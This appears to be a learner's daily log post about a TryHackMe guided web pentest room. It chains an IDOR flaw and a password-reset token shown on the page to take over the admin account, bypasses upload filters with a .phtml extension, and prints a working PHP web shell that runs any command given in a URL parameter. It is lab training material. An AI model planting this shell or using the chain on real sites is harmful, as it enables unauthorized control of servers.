Day 94 - Done ✅ Practical (TryHackMe): - I have Started the JR.Penetration tester path and completed my first room in this - Guided Pentest: web.
In this room I got a vulnerable website and challenge of pentest it .
So I started with reconnaissance and enumeration of the website and I found that the server is running on Apache, mysql DB and also some pages such as /admin, /reset etc.
Then I found the IDOR flaw in this website which returns the data of another users means it doesn't authorized any users.
Then I found that there is one vulnerability in this which is on the reset.php page which shows the token for reset password on the web page which critical.
Then from this two vulnerability I reset the admin users password and gain admin access .
Then I found there is a upload option for admin only so check it and found that it applies the specific extensions only uploads on both frontend and backend so I bypass them by edit the inspect element on frontend and for backend I use .phtml extension as the backend blocks .php files but I use this alternative which the backend accepts.
And upload this script on the server - 
  <?php
    if(isset($_GET['cmd'])) {
      echo "<pre>" . shell_exec($_GET['cmd']) . "</pre>";
    }
  ?>
which allow me to send and execute the command on the web server.

So there is no single little vulnerability that allow any hacker to hack any app but the chain of vulnerabilities does.

